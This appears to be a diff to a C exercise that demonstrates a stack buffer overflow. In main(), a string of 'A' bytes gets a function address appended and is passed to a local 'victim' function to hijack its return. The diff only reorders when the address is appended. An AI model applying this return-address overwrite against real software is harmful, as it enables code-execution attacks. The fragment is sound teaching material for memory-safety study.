@@ -60,11 +60,12 @@ int main(int argc, char* argv[])
         evil_str[j] = 0x41;
     }
 
+    append_address(evil_str, address_start_byte, function_addr);
+    // hexdump_arr(evil_str);   // Uncomment for debug
+
     victim(safe_str); // Call victim with typical input string
     printf("Returned from safe_str call\n");
 
-    append_address(evil_str, address_start_byte, function_addr);
-    // hexdump_arr(evil_str);   // Uncomment for debug
     victim(evil_str);
     printf("Returned from evil_str call\n");
     printf("Try again :(\n");
